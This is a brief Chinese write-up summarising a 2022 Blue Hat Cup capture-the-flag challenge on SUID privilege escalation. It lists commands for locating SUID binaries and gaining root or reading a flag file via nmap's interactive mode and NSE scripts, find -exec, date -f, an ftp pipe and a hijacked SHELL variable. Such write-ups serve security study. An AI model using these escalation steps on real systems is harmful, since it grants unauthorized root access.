# 2022 蓝帽杯 SUID 提权 总结篇

> 赛事：蓝帽杯 2022 2022 | 方向：web | 难度：medium | 工具：nmap

## 一句话总结

SUID 提权 5 种经典路径：nmap / find-exec / date -f / ftp env / SHELL hijack

## 攻击链

1. find SUID 文件：find / -user root -perm -4000 2>/dev/null
2. nmap --interactive 进入交互模式 !sh 提权
3. sudo nmap --script=/tmp/shell.nse 跑 lua 脚本
4. find -exec whoami ; 用空格 + 分号执行命令
5. date -f /flag 触发错误读文件
6. putenv('SHELL=/usr/bin/od') 劫持 SHELL 环境变量
7. proc_open ftp + 管道输入 ! /flag 读文件

## 关键 payload

```
nmap --interactive → !sh / sudo nmap --script=shell.nse
```

## 经验教训

SUID 位运行 root 程序时应避免调用外部命令或保留 SHELL 路径；sudo nmap 加载 lua 脚本是 GTFObins 经典
